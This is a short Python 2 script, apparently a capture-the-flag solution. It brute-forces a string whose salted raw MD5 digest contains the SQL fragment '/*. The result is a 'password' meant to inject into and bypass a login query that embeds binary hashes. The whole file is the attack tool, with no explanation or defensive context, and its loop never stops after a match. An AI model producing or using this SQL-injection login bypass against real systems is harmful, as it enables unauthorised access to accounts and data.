#!/usr/bin/python

from hashlib import md5
import requests
import random
import sys

SALT = sys.argv[1]

print '[-] Generating password'
# Generate password with '/*
while True:
    s = str(random.random())
    if "'/*" in md5(SALT+s).digest():
        print '[+] Use %s as password' % s 
